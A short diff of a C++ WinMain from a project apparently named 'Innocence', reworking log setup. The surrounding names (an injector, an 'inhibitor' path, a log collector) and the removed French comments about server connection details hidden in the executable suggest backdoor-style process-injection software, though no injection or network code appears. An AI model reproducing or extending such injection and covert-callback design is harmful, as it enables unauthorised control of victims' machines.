@@ -27,19 +27,10 @@ void Inject(InhibiterCore& injector, const string& inhibitorPath);
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {	
     TRACE_FUNCTION
-	System::Process::This thisProcess;
-
-#ifdef INNOCENCE_DEBUG
-	// le nom du programme doit apparaitre dans les messages de debug
-    LOG.setHeader(thisProcess.getProgramName());
-    
-    // les informations de connexions vers le serveur se trouvent dans une chaine de 
-    // caractere avec un certain format située dans l'exécutable
-	// on va parser les infos de connexions à partir de la chaine
-    
+    LOG.setIdentity(Innocence::identity);
 	LOG.addObserver(new Common::LogToCollector);
-#endif
 
+	System::Process::This thisProcess;
     InhibiterCore injector (thisProcess.getProgramPath());
     LOG << "Program path : " + thisProcess.getProgramPath();
     LOG << "Arguments count : " + toString(thisProcess.getArgCount());
